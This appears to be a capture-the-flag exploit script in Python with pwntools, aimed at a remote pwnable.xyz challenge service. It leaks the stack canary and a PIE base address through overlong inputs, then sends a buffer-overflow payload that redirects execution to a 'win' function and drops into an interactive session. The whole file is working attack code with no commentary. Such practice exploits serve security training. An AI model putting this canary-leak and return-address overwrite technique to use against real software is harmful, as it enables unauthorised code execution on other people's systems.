from pwn import *
from ctypes import *

context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30027)
lib = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

while True:
	p.recvuntil('me  > ')
	re = p.recvline().strip()
	log.info('me > {}'.format(re))
	if len(re) >= 105:
		sa('you > ','A'*104+'B')
		p.recvuntil('A'*104) 
		can = u64(p.recv(8)) - ord('B')
		log.info('Canary : {}'.format(hex(can)))
		break
	else:
		sa('you > ','B')

while True:
	p.recvuntil('me  > ')
	re = p.recvline().strip()
	log.info('me > {}'.format(re))
	if len(re) >= 121:
		sa('you > ','A'*120)
		p.recvuntil('A'*120)
		pie = u64(p.recv(6)+'\x00\x00') - 0x1081
		log.info('PIE : {}'.format(hex(pie)))
		break
	else:
		sa('you > ','C')

payload = 'A'*104 + p64(can) +'A'*8 + p64(pie + 0xd30) # win

while True:
	p.recvuntil('me  > ')
	re = p.recvline().strip()
	log.info('me > {}'.format(re))
	if len(re) >= len(payload):
		sa('you > ',payload)
		break
	else:
		sa('you > ','D')

sa('you > ','exit')
p.interactive()